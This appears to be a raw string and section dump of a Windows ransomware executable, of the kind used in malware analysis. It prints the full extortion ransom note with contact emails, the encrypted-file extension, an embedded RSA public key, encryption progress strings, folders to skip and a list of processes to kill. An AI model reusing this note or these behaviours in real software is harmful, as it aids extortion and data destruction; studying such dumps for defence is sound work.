Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr          size vaddr         vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400  0x36800 0x00401000  0x37000 -r-x .text
1   0x00036c00   0x8200 0x00438000   0x9000 -r-- .rdata
2   0x0003ee00    0x200 0x00441000   0x5000 -rw- .data
3   0x0003f000   0x1e00 0x00446000   0x2000 -r-- .reloc

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x00432860 paddr=0x00031c60 haddr=0x00000138 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr      bind type lib          name
60  0x000375e4 0x004389e4 9    20   .rdata  utf16le \ida 6.8\
61  0x000375f8 0x004389f8 20   42   .rdata  utf16le \Default\Extensions\
62  0x00037624 0x00438a24 26   54   .rdata  utf16le \Temporary Internet Files\
63  0x0003765c 0x00438a5c 11   24   .rdata  utf16le \Microsoft\
64  0x00037674 0x00438a74 6    14   .rdata  utf16le \Temp\
65  0x00037684 0x00438a84 12   26   .rdata  utf16le $windows.~bt
66  0x000376a0 0x00438aa0 12   26   .rdata  utf16le $windows.~ws
67  0x000376bc 0x00438abc 8    18   .rdata  utf16le \google\
68  0x000376d0 0x00438ad0 9    20   .rdata  utf16le \mozilla\
69  0x000376e4 0x00438ae4 13   28   .rdata  utf16le \tor browser\
70  0x00037700 0x00438b00 13   28   .rdata  utf16le \windows.old\
71  0x0003771c 0x00438b1c 7    16   .rdata  utf16le \intel\
72  0x0003772c 0x00438b2c 10   22   .rdata  utf16le \msocache\
73  0x00037744 0x00438b44 10   22   .rdata  utf16le \perflogs\
74  0x0003776c 0x00438b6c 22   23   .rdata  ascii   %ws  -> WorkModeEnded\n
75  0x00037784 0x00438b84 24   25   .rdata  ascii   %ws  -> WorkModeSorting\n
76  0x000377a0 0x00438ba0 98   99   .rdata  ascii   %ws -> WorkModeFindFiles : %d files / %d folders found (already (de?)crypted %d/%d) (lf = %ws)...\n
77  0x00037804 0x00438c04 24   25   .rdata  ascii   %ws FINDFILES time : %s\n
78  0x00037820 0x00438c20 134  135  .rdata  ascii   %ws -> WorkModeEncryptFiles : %d of %d files encrypted +%d [bps : %d, size = %d MB] (%d skipped, ld = %d.%d.%d %d:%d:%d, lf = %ws)...\n
79  0x000378a8 0x00438ca8 70   71   .rdata  ascii   %ws -> WorkModeDecryptFiles : %d of %d files decrypted +%d (%d MB)...\n
80  0x000378f0 0x00438cf0 21   22   .rdata  ascii   %s SORTING time : %s\n
81  0x00037908 0x00438d08 52   53   .rdata  ascii   %ws ENCRYPTFILES count : %d (%d skipped), time : %s\n
82  0x00037940 0x00438d40 86   87   .rdata  ascii   %ws FINDFILES RESULTS : dwDirectoriesCount = %d, dwFilesCount = %d MB = %d (FIND END)\n
83  0x00037998 0x00438d98 21   22   .rdata  ascii   EncryptDisk(%ws) DONE
84  0x000379c0 0x00438dc0 16   34   .rdata  utf16le .morseop-7j9wrqr
85  0x000379e4 0x00438de4 16   34   .rdata  utf16le .morseop-7j9wrqr
86  0x00037a08 0x00438e08 1870 1871 .rdata  ascii   \r\n\r\nHello!\r\n\r\nFiles on your computers are encoded by a hard algorithm.\r\n\r\nYour network has been penetrated.\r\n\r\nAll data on each machine in the network have been access denied with a intricate cryptoalgorithm.\r\nreservation copies were either ciphered or deleted. Volume Shadow copies also erased. \r\n\r\nDO NOT DELETE the encrypted and readme files.\r\nThis stuff I'm telling you could get to the impracticability of recovery your files\r\nDO NOT RESET OR SHUTDOWN - files may be unrecoverable.\r\nDO NOT DELETE *.morseop-7j9wrqr files.\r\n\r\nTo get information how to decrypt your files, write to us at the address below:\r\n\r\n greemsy.jj@protonmail.ch \r\n jj.greemsy@mailfence.com  \r\n\r\nWe have downloaded your essential data. If you will not cooperate with us, your data will be sold on auction\r\n\r\nTo confirm our honest intentions we will decrypt few files for free.\r\nSend one-two-three different protected docs with extension *.morseop-7j9wrqr. Documents must not hold essential information.\r\nFiles must be packed and sent to us (SUBJ : your domain name).\r\nIt can be from different machines on your infrastructure to be sure we decode everything.\r\n\r\nThe procedure to recovery is very simply:\r\nAfter receiving bitcoins We will send you any you need to restore normal operation of your network.\r\n\r\nNot lose time, send email with files bound quickly as possible.\r\n\r\n\r\nIf you will not co-operate with our service - for us, it's doesnot matter. But you will lose your time and data, cause just we have the decoder.\r\nif you exposure with the police forces, then they completely BLOCK any busyness (mainly financial) of the corporation until the end of the proceedings on their part.\r\nIf we do not do our works and commitments - nobody will not cooperate with us. It's not in our interests.\r\nIt's just a  job. We absolutely do not care about you and your deals, except getting benefits.\r\n\r\n
87  0x00038158 0x00439558 17   18   .rdata  ascii   RtlCompressBuffer
88  0x0003816c 0x0043956c 9    10   .rdata  ascii   ntdll.dll
89  0x00038178 0x00439578 30   31   .rdata  ascii   RtlGetCompressionWorkSpaceSize
90  0x00038198 0x00439598 9    10   .rdata  ascii   ntdll.dll
91  0x000381b8 0x004395b8 9    20   .rdata  utf16le kill-susp
92  0x000381cc 0x004395cc 18   19   .rdata  ascii   DRIVE_FIXED : %ws\n
93  0x000381e0 0x004395e0 15   32   .rdata  utf16le --enable-shares
94  0x00038200 0x00439600 69   70   .rdata  ascii   EMAILS : \r\n greemsy.jj@protonmail.ch \r\n jj.greemsy@mailfence.com  \r\n\n
95  0x00038258 0x00439658 451  452  .rdata  ascii   -----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvVeH9JIAxSvKNkURv5XQ\nllqDBH37j+9wrQRVi+9kIErEAXYN3izS+B4Uo5p+fG3iSuqt/sT9e3FUquo1JwH3\nj4kO53f19lJp5uhoBTVa4x8bHARhgviWdBKVo8m64K+9pkc7VbaLeylHIE42yjt6\nf5RoRRIc3Lv9T1iz8qzJf58t9kWBLfn2MD0hkVznEfKCV2GDNyTwO7amTERk5qdo\nNam4odK3JFpmq25k4Knc8jdzgB6hbrTd9nYGxN59khjbhhxvOA5s0XxgZ2yreKEZ\n0F2a+g+zjxxNddC5GITwOWFKyvcdSJedFzJsoKEILt1tzUGlLmfNLjjdm571TJgj\n1wIDAQAB\n-----END PUBLIC KEY-----\n
96  0x0003841c 0x0043981c 50   51   .rdata  ascii    failed\n ! mbedtls_ctr_drbg_init returned -0x%04x\n
97  0x00038450 0x00439850 50   51   .rdata  ascii    failed\n ! mbedtls_ctr_drbg_seed returned -0x%04x\n
98  0x00038484 0x00439884 38   39   .rdata  ascii   mbedtls_pk_parse_public_key error : %d
99  0x000384b0 0x004398b0 14   15   .rdata  ascii   %d:%d:%d:%d.%d
100 0x000384c0 0x004398c0 23   24   .rdata  ascii   WaitForHours() : gogogo
101 0x000384d8 0x004398d8 73   74   .rdata  ascii   WaitForHours() : waiting for sacred time... Expecting %d hours, now id %d
102 0x00038524 0x00439924 26   27   .rdata  ascii   ScheduleRoutine() : gogogo
103 0x00038540 0x00439940 76   77   .rdata  ascii   ScheduleRoutine() : waiting for sacred time... Expecting %d hours, now id %d
104 0x00038594 0x00439994 14   30   .rdata  utf16le powershell.exe
105 0x000385b4 0x004399b4 12   26   .rdata  utf16le rundll32.exe
106 0x000385d0 0x004399d0 12   26   .rdata  utf16le werfault.exe
107 0x000385ec 0x004399ec 12   26   .rdata  utf16le explorer.exe
108 0x00038608 0x00439a08 13   28   .rdata  utf16le vmnetdhcp.exe
109 0x00038624 0x00439a24 16   34   .rdata  utf16le vmware-authd.exe
110 0x00038648 0x00439a48 16   34   .rdata  utf16le vmware-hostd.exe
111 0x0003866c 0x00439a6c 15   32   .rdata  utf16le vmware-tray.exe
112 0x0003868c 0x00439a8c 26   54   .rdata  utf16le vmware-usbarbitrator64.exe
113 0x000386c4 0x00439ac4 26   54   .rdata  utf16le vmware-usbarbitrator32.exe
114 0x000386fc 0x00439afc 19   40   .rdata  utf16le webroot_updater.exe
115 0x00038724 0x00439b24 17   36   .rdata  utf16le windowsupdate.exe
116 0x00038748 0x00439b48 24   50   .rdata  utf16le vmware-usbarbitrator.exe
117 0x0003877c 0x00439b7c 12   26   .rdata  utf16le %SystemRoot%
118 0x0003879c 0x00439b9c 16   34   .rdata  utf16le .morseop-7j9wrqr
119 0x000387c0 0x00439bc0 25   26   .rdata  ascii   re-decrypt file %ws, %ws\n
120 0x0003881d 0x00439c1d 6    7    .rdata  ascii   D7q/;M
121 0x00038856 0x00439c56 5    7    .rdata  utf8    \aؾopE blocks=Basic Latin,Arabic
122 0x0003886d 0x00439c6d 4    5    .rdata  ascii   }\fUo
123 0x000388ab 0x00439cab 5    7    .rdata  utf8    w̡\f$u blocks=Basic Latin,Combining Diacritical Marks
124 0x000388b2 0x00439cb2 4    5    .rdata  ascii   +Yo,
125 0x0003890b 0x00439d0b 4    5    .rdata  ascii   \ng))
126 0x0003891a 0x00439d1a 6    7    .rdata  ascii   &\8!\e.
127 0x00038925 0x00439d25 4    6    .rdata  utf8    m,M߳ blocks=Basic Latin,NKo
128 0x00038934 0x00439d34 4    5    .rdata  ascii   Ts\ne
129 0x00038980 0x00439d80 4    5    .rdata  ascii   * qW
130 0x0003899a 0x00439d9a 5    6    .rdata  ascii   AQ\bl7
131 0x000389a4 0x00439da4 4    5    .rdata  ascii   LwH'
132 0x000389c2 0x00439dc2 5    7    .rdata  utf8    cwOʜ[ blocks=Basic Latin,IPA Extensions
133 0x000389d3 0x00439dd3 5    8    .rdata  utf8    ]t`/ blocks=Basic Latin,Private Use Area
134 0x00038a0d 0x00439e0d 5    7    .rdata  utf8    xqƜa& blocks=Basic Latin,Latin Extended-B
135 0x00038a4c 0x00439e4c 4    5    .rdata  ascii   5\vq\e
136 0x00038a77 0x00439e77 4    5    .rdata  ascii   L*~e
137 0x00038be8 0x00439fe8 19   80   .rdata  utf32le %)+/5;=CGIOSYaegkmq
138 0x00038e77 0x0043a277 6    7    .rdata  ascii   [^H_JI
139 0x00038e99 0x0043a299 5    6    .rdata  ascii   2cV]8
140 0x00038ea8 0x0043a2a8 10   11   .rdata  ascii   h^j@GPm|_}
141 0x00038ed4 0x0043a2d4 5    6    .rdata  ascii   .2!Zd
142 0x00038f13 0x0043a313 5    7    .rdata  utf8    ]eģ&w blocks=Basic Latin,Latin Extended-A
143 0x00038f74 0x0043a374 4    5    .rdata  ascii   I0$r
144 0x00038f88 0x0043a388 4    6    .rdata  utf8    ր24" blocks=Armenian,Basic Latin
145 0x00038fde 0x0043a3de 5    7    .rdata  utf8    0x1(Ҵ blocks=Basic Latin,Cyrillic
146 0x00038ff9 0x0043a3f9 5    6    .rdata  ascii   H:XV`
147 0x0003900e 0x0043a40e 4    7    .rdata  utf8    ͮBhƛ blocks=Combining Diacritical Marks,Basic Latin,Latin Extended-B
148 0x00039016 0x0043a416 8    10   .rdata  utf8    M}q\b3pʜc blocks=Basic Latin,IPA Extensions
149 0x00039061 0x0043a461 5    6    .rdata  ascii   ^1kW3
150 0x00039077 0x0043a477 4    5    .rdata  ascii   O\td8
151 0x00039085 0x0043a485 4    7    .rdata  utf8    ɵ;Х\t blocks=IPA Extensions,Basic Latin,Cyrillic
152 0x00039163 0x0043a563 4    5    .rdata  ascii   M3[E
153 0x000391b3 0x0043a5b3 5    6    .rdata  ascii   DdG\aZ
154 0x00039214 0x0043a614 4    7    .rdata  utf8    α`\n8 blocks=Greek and Coptic,Basic Latin
155 0x0003922f 0x0043a62f 4    5    .rdata  ascii   ]o,&
156 0x00039237 0x0043a637 4    5    .rdata  ascii   6wSn
157 0x0003923f 0x0043a63f 4    5    .rdata  ascii    ( &
158 0x00039258 0x0043a658 7    10   .rdata  utf8    AA6Ќ^ҿ; blocks=Basic Latin,Cyrillic
159 0x0003929b 0x0043a69b 4    5    .rdata  ascii   P~o]
160 0x000392bc 0x0043a6bc 4    5    .rdata  ascii   /HK,
161 0x000393d6 0x0043a7d6 4    5    .rdata  ascii   zA0u
162 0x000393e0 0x0043a7e0 4    5    .rdata  ascii   u\tZ}
163 0x00039415 0x0043a815 10   11   .rdata  ascii   \nvr8^T:l)U
164 0x00039423 0x0043a823 4    5    .rdata  ascii   U8*T
165 0x00039496 0x0043a896 6    7    .rdata  ascii   U#C9\v'
166 0x000394a2 0x0043a8a2 5    6    .rdata  ascii   DPV2A
167 0x000394bc 0x0043a8bc 4    7    .rdata  utf8    sH3ި blocks=Basic Latin,Thaana
168 0x000394d1 0x0043a8d1 4    5    .rdata  ascii   =Mk`
169 0x0003956c 0x0043a96c 5    6    .rdata  ascii   \n\br<\f
170 0x00039593 0x0043a993 4    5    .rdata  ascii   tjFi
171 0x000395a8 0x0043a9a8 6    7    .rdata  ascii   =*\\E)
172 0x000395e3 0x0043a9e3 11   13   .rdata  utf8    LA\>Up\b3pʜc blocks=Basic Latin,IPA Extensions
173 0x00039659 0x0043aa59 4    5    .rdata  ascii   S<&A
174 0x00039663 0x0043aa63 4    5    .rdata  ascii   w!FF
175 0x00039688 0x0043aa88 4    6    .rdata  utf8    Pfџv blocks=Basic Latin,Cyrillic
176 0x00039695 0x0043aa95 5    6    .rdata  ascii   p<5a\a
177 0x000396a8 0x0043aaa8 4    5    .rdata  ascii   ,f>'
178 0x000396c4 0x0043aac4 4    5    .rdata  ascii   xj)9
179 0x000396ef 0x0043aaef 4    5    .rdata  ascii   P~o]
180 0x00039fbf 0x0043b3bf 11   12   .rdata  ascii   ?456789:;<=
181 0x00039fd8 0x0043b3d8 7    8    .rdata  ascii   \a\b\t\n\v\f\r
182 0x00039ff7 0x0043b3f7 20   21   .rdata  ascii    !"#$%&'()*+,-./0123
183 0x0003a010 0x0043b410 64   65   .rdata  ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
184 0x0003a053 0x0043b453 4    5    .rdata  ascii   \a\b\v\r
185 0x0003a060 0x0043b460 47   48   .rdata  ascii    #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|
186 0x0003a9fd 0x0043bdfd 5    6    .rdata  ascii   }\fUt]
187 0x0003aa1c 0x0043be1c 5    7    .rdata  utf8    ̡\f$o, blocks=Combining Diacritical Marks,Basic Latin
188 0x0003aa2f 0x0043be2f 4    5    .rdata  ascii   vRQ>
189 0x0003aa53 0x0043be53 5    6    .rdata  ascii   '8!\e.
190 0x0003aa5d 0x0043be5d 7    8    .rdata  ascii   \r8STs\ne
191 0x0003aa65 0x0043be65 4    5    .rdata  ascii   \njv.
192 0x0003aa7a 0x0043be7a 4    6    .rdata  utf8    K£Ql blocks=Basic Latin,Latin-1 Supplement
193 0x0003aa98 0x0043be98 4    5    .rdata  ascii   LwH'
194 0x0003aaa7 0x0043bea7 4    6    .rdata  utf8    NOʜ[ blocks=Basic Latin,IPA Extensions
195 0x0003aaad 0x0043bead 7    10   .rdata  utf8    o.htoc blocks=Basic Latin,Private Use Area
196 0x0003b746 0x0043cb46 4    5    .rdata  ascii   VM\rf
197 0x0003b79b 0x0043cb9b 4    5    .rdata  ascii   \nIh8
198 0x0003b7ec 0x0043cbec 4    5    .rdata  ascii   \v\b\t\n
199 0x0003b844 0x0043cc44 4    5    .rdata  ascii   QVlM
200 0x0003b879 0x0043cc79 4    7    .rdata  utf8    Dϲõz blocks=Basic Latin,Greek and Coptic,Latin-1 Supplement
201 0x0003b8ef 0x0043ccef 7    8    .rdata  ascii   \n6I*h<8
202 0x0003b94e 0x0043cd4e 5    6    .rdata  ascii   %{\rq_
203 0x0003b992 0x0043cd92 6    8    .rdata  utf8    t½6"8d blocks=Basic Latin,Latin-1 Supplement
204 0x0003b9e9 0x0043cde9 4    6    .rdata  utf8    -ޖ&} blocks=Basic Latin,Thaana
205 0x0003baaa 0x0043ceaa 4    5    .rdata  ascii   tT0~
206 0x0003baaf 0x0043ceaf 4    5    .rdata  ascii   (UhP
207 0x0003babe 0x0043cebe 4    5    .rdata  ascii   2i\bb
208 0x0003bb12 0x0043cf12 4    6    .rdata  utf8    ܪ|wV blocks=Syriac,Basic Latin
209 0x0003bb34 0x0043cf34 8    9    .rdata  ascii   \b\t\n\v&'$%
210 0x0003bb84 0x0043cf84 4    5    .rdata  ascii   =>?<
211 0x0003bb90 0x0043cf90 4    5    .rdata  ascii   # !"
212 0x0003bb98 0x0043cf98 4    5    .rdata  ascii   \b\t\n\v
213 0x0003bba4 0x0043cfa4 4    5    .rdata  ascii   '$%&
214 0x0003bbb0 0x0043cfb0 4    5    .rdata  ascii   :;89
215 0x0003bbbf 0x0043cfbf 5    6    .rdata  ascii   \aABC@
216 0x0003bbcc 0x0043cfcc 4    5    .rdata  ascii   +()*
217 0x0003bbf1 0x0043cff1 4    5    .rdata  ascii   !(Ew
218 0x0003bc05 0x0043d005 5    8    .rdata  utf8    P|ɵՄ? blocks=Basic Latin,IPA Extensions,Armenian
219 0x0003bc32 0x0043d032 5    8    .rdata  utf8    Ḗ~&jE blocks=Latin Extended Additional,Basic Latin
220 0x0003bc51 0x0043d051 7    8    .rdata  ascii    iciNWq
221 0x0003bc67 0x0043d067 4    6    .rdata  utf8    rX͋q blocks=Basic Latin,Combining Diacritical Marks
222 0x0003bcab 0x0043d0ab 5    6    .rdata  ascii   x`\`U
223 0x0003bcb1 0x0043d0b1 4    7    .rdata  utf8    %U攫U blocks=Basic Latin,CJK Unified Ideographs
224 0x0003bcc7 0x0043d0c7 4    6    .rdata  utf8    *4\̴ blocks=Basic Latin,Combining Diacritical Marks
225 0x0003bcde 0x0043d0de 5    7    .rdata  utf8    oc]ũ+ blocks=Basic Latin,Latin Extended-A
226 0x0003bcf9 0x0043d0f9 4    5    .rdata  ascii   S2zw
227 0x0003bd0b 0x0043d10b 4    6    .rdata  utf8    ē!(f blocks=Latin Extended-A,Basic Latin
228 0x0003bd29 0x0043d129 5    7    .rdata  utf8    #&܈\ee blocks=Basic Latin,Syriac
229 0x0003bd5e 0x0043d15e 7    10   .rdata  utf8    ӫҠQjh/T blocks=Cyrillic,Basic Latin
230 0x0003bdb5 0x0043d1b5 4    5    .rdata  ascii   w?6r
231 0x0003bdd1 0x0043d1d1 5    6    .rdata  ascii   rS\a{\e
232 0x0003bdfa 0x0043d1fa 5    6    .rdata  ascii   \^c$j
233 0x0003be37 0x0043d237 4    5    .rdata  ascii   E9_\v
234 0x0003be42 0x0043d242 5    6    .rdata  ascii   yU\n2`
235 0x0003be4c 0x0043d24c 4    5    .rdata  ascii   yr,@
236 0x0003be78 0x0043d278 4    5    .rdata  ascii   H{1S
237 0x0003bed4 0x0043d2d4 4    6    .rdata  utf8    3~ˤA blocks=Basic Latin,Spacing Modifier Letters
238 0x0003bf05 0x0043d305 5    7    .rdata  utf8    %ǯ/[< blocks=Basic Latin,Latin Extended-B
239 0x0003bf31 0x0043d331 4    5    .rdata  ascii   "//w
240 0x0003bfb5 0x0043d3b5 7    10   .rdata  utf8    SZ٢[} Ź blocks=Basic Latin,Arabic,Latin Extended-A
241 0x0003bfcc 0x0043d3cc 4    5    .rdata  ascii   AJsN
242 0x0003bffe 0x0043d3fe 5    6    .rdata  ascii   \r*!ec
243 0x0003c021 0x0043d421 5    6    .rdata  ascii   pzKD)
244 0x0003c047 0x0043d447 7    11   .rdata  utf8    ilRdVឱ¥ blocks=Basic Latin,Khmer,Latin-1 Supplement
245 0x0003c054 0x0043d454 5    6    .rdata  ascii   )L\tu@
246 0x0003c05f 0x0043d45f 4    7    .rdata  utf8    䚘T?e blocks=CJK Unified Ideographs Extension A,Basic Latin
247 0x0003c090 0x0043d490 4    5    .rdata  ascii   ?kh\t
248 0x0003c0e7 0x0043d4e7 4    5    .rdata  ascii   |sG2
249 0x0003c153 0x0043d553 5    6    .rdata  ascii   U$qk.
250 0x0003c178 0x0043d578 4    5    .rdata  ascii   fC\tc
251 0x0003c187 0x0043d587 4    5    .rdata  ascii   27;C
252 0x0003c1a3 0x0043d5a3 4    5    .rdata  ascii   qUN1
253 0x0003c1d0 0x0043d5d0 4    7    .rdata  utf8    pEㆱo blocks=Basic Latin,Bopomofo Extended
254 0x0003c242 0x0043d642 4    6    .rdata  utf8    2åZl blocks=Basic Latin,Latin-1 Supplement
255 0x0003c25d 0x0043d65d 4    5    .rdata  ascii   /n[(
256 0x0003c264 0x0043d664 6    7    .rdata  ascii   pa\a)uG
257 0x0003c2ae 0x0043d6ae 6    7    .rdata  ascii   Ze2Zh@
258 0x0003c2f3 0x0043d6f3 5    6    .rdata  ascii   Wcr"\e
259 0x0003c304 0x0043d704 4    5    .rdata  ascii   T0.S
260 0x0003c309 0x0043d709 4    6    .rdata  utf8    Hُ(1 blocks=Basic Latin,Arabic
261 0x0003c39c 0x0043d79c 4    5    .rdata  ascii   ap?#
262 0x0003c3a2 0x0043d7a2 4    5    .rdata  ascii   r3A~
263 0x0003c3ad 0x0043d7ad 5    6    .rdata  ascii   ;"lY7
264 0x0003c3bb 0x0043d7bb 5    7    .rdata  utf8    @n2w΄ blocks=Basic Latin,Greek and Coptic
265 0x0003c3fa 0x0043d7fa 5    6    .rdata  ascii   _g@Cg
266 0x0003c489 0x0043d889 9    12   .rdata  utf8    G%ښ\nʫ%xP( blocks=Basic Latin,Arabic,IPA Extensions
267 0x0003c497 0x0043d897 4    6    .rdata  utf8    Sچ,\n blocks=Basic Latin,Arabic
268 0x0003c4cc 0x0043d8cc 5    6    .rdata  ascii   B*k@5
269 0x0003c4e6 0x0043d8e6 4    5    .rdata  ascii   mK1f
270 0x0003c4f2 0x0043d8f2 5    6    .rdata  ascii   n:2C[
271 0x0003c507 0x0043d907 5    7    .rdata  utf8    جV@E' blocks=Arabic,Basic Latin
272 0x0003c510 0x0043d910 4    5    .rdata  ascii   ::SU
273 0x0003c53b 0x0043d93b 4    5    .rdata  ascii   ^|1)
274 0x0003c57f 0x0043d97f 6    7    .rdata  ascii   A4x{%`
275 0x0003c5a6 0x0043d9a6 7    8    .rdata  ascii   >3b\v$;"
276 0x0003c5c8 0x0043d9c8 4    5    .rdata  ascii   b\b}d
277 0x0003c5e0 0x0043d9e0 5    6    .rdata  ascii   AcG\nt
278 0x0003c5e9 0x0043d9e9 4    5    .rdata  ascii   no:7
279 0x0003c604 0x0043da04 5    6    .rdata  ascii   7,gm;
280 0x0003c641 0x0043da41 5    6    .rdata  ascii   .97yY
281 0x0003c652 0x0043da52 5    6    .rdata  ascii   Bh;+j
282 0x0003c65e 0x0043da5e 4    5    .rdata  ascii   .x7B
283 0x0003c6a9 0x0043daa9 5    6    .rdata  ascii   {x`M`
284 0x0003c6d6 0x0043dad6 7    10   .rdata  utf8    轙BFUa.X blocks=CJK Unified Ideographs,Basic Latin
285 0x0003c711 0x0043db11 5    6    .rdata  ascii   YnFpW
286 0x0003c739 0x0043db39 6    7    .rdata  ascii   \t-f3F2
287 0x0003c7c6 0x0043dbc6 8    9    .rdata  ascii   |K=\nr9$|
288 0x0003c7cf 0x0043dbcf 4    7    .rdata  utf8    |_rㆹ blocks=Basic Latin,Bopomofo Extended
289 0x0003c807 0x0043dc07 5    7    .rdata  utf8    Vο*67 blocks=Basic Latin,Greek and Coptic
290 0x0003c828 0x0043dc28 5    7    .rdata  utf8    7w«\e- blocks=Basic Latin,Latin-1 Supplement
291 0x0003c85d 0x0043dc5d 4    5    .rdata  ascii   n6j/
292 0x0003c862 0x0043dc62 4    5    .rdata  ascii   HWyn
293 0x0003c873 0x0043dc73 4    6    .rdata  utf8    S}ލF blocks=Basic Latin,Thaana
294 0x0003c87f 0x0043dc7f 6    8    .rdata  utf8    Lۻ9)PF blocks=Basic Latin,Arabic
295 0x0003c90c 0x0043dd0c 4    5    .rdata  ascii   (-}|
296 0x0003c935 0x0043dd35 5    6    .rdata  ascii   W;()f
297 0x0003c942 0x0043dd42 5    6    .rdata  ascii   _xU`u
298 0x0003c998 0x0043dd98 4    6    .rdata  utf8    gQ̫_ blocks=Basic Latin,Combining Diacritical Marks
299 0x0003c9a6 0x0043dda6 4    5    .rdata  ascii   08bX
300 0x0003c9be 0x0043ddbe 7    10   .rdata  utf8    Ow~㶨F=) blocks=Basic Latin,CJK Unified Ideographs Extension A
301 0x0003c9db 0x0043dddb 7    8    .rdata  ascii   if!\a\t\nF
302 0x0003ca06 0x0043de06 6    7    .rdata  ascii   Y:D\n5>
303 0x0003ca23 0x0043de23 10   13   .rdata  utf8    Ҟ]/T\ew®pcN blocks=Cyrillic,Basic Latin,Latin-1 Supplement
304 0x0003caf0 0x0043def0 5    7    .rdata  utf8    ^\av\fj
305 0x0003cb20 0x0043df20 4    5    .rdata  ascii   At\n\e
306 0x0003cbdb 0x0043dfdb 6    7    .rdata  ascii   w``u N
307 0x0003cc08 0x0043e008 4    5    .rdata  ascii   -%\t?
308 0x0003cc1f 0x0043e01f 11   12   .rdata  ascii   :invalid PK
309 0x0003cc4c 0x0043e04c 29   30   .rdata  ascii   -----END RSA PRIVATE KEY-----
310 0x0003cc6c 0x0043e06c 31   32   .rdata  ascii   -----BEGIN RSA PRIVATE KEY-----
311 0x0003cc8c 0x0043e08c 28   29   .rdata  ascii   -----END EC PRIVATE KEY-----
312 0x0003ccac 0x0043e0ac 30   31   .rdata  ascii   -----BEGIN EC PRIVATE KEY-----
313 0x0003cccc 0x0043e0cc 25   26   .rdata  ascii   -----END PRIVATE KEY-----
314 0x0003cce8 0x0043e0e8 27   28   .rdata  ascii   -----BEGIN PRIVATE KEY-----
315 0x0003cd04 0x0043e104 35   36   .rdata  ascii   -----END ENCRYPTED PRIVATE KEY-----
316 0x0003cd28 0x0043e128 37   38   .rdata  ascii   -----BEGIN ENCRYPTED PRIVATE KEY-----
317 0x0003cd50 0x0043e150 28   29   .rdata  ascii   -----END RSA PUBLIC KEY-----
318 0x0003cd70 0x0043e170 30   31   .rdata  ascii   -----BEGIN RSA PUBLIC KEY-----
319 0x0003cd90 0x0043e190 24   25   .rdata  ascii   -----END PUBLIC KEY-----
320 0x0003cdac 0x0043e1ac 26   27   .rdata  ascii   -----BEGIN PUBLIC KEY-----
321 0x0003cdc8 0x0043e1c8 5    6    .rdata  ascii   rsa.N
322 0x0003cdd0 0x0043e1d0 5    6    .rdata  ascii   rsa.E
323 0x0003cddc 0x0043e1dc 7    8    .rdata  ascii   eckey.Q
324 0x0003cde8 0x0043e1e8 5    6    .rdata  ascii   EC_DH
325 0x0003cdf0 0x0043e1f0 5    6    .rdata  ascii   ECDSA
326 0x0003cdf8 0x0043e1f8 7    8    .rdata  ascii   RSA-alt
327 0x0003ce04 0x0043e204 9    10   .rdata  ascii   RIPEMD160
328 0x0003ce10 0x0043e210 4    5    .rdata  ascii   SHA1
329 0x0003ce1c 0x0043e21c 6    7    .rdata  ascii   SHA224
330 0x0003ce24 0x0043e224 6    7    .rdata  ascii   SHA256
331 0x0003ce2c 0x0043e22c 6    7    .rdata  ascii   SHA384
332 0x0003ce34 0x0043e234 6    7    .rdata  ascii   SHA512
333 0x0003ce40 0x0043e240 16   17   .rdata  ascii   0123456789ABCDEF
334 0x0003ce54 0x0043e254 6    7    .rdata  ascii   01DB42
335 0x0003ce60 0x0043e260 32   33   .rdata  ascii   14DEF9DEA2F79CD65812631A5CF5D3ED
336 0x0003ce84 0x0043e284 4    5    .rdata  ascii   98AA
337 0x0003ce90 0x0043e290 56   57   .rdata  ascii   8335DC163BB124B65129C96FDE933D8D723A70AADC873D6D54A7BB0D
338 0x0003cecc 0x0043e2cc 9    10   .rdata  ascii   secp521r1
339 0x0003ced8 0x0043e2d8 15   16   .rdata  ascii   brainpoolP512r1
340 0x0003cee8 0x0043e2e8 9    10   .rdata  ascii   secp384r1
341 0x0003cef4 0x0043e2f4 15   16   .rdata  ascii   brainpoolP384r1
342 0x0003cf04 0x0043e304 9    10   .rdata  ascii   secp256r1
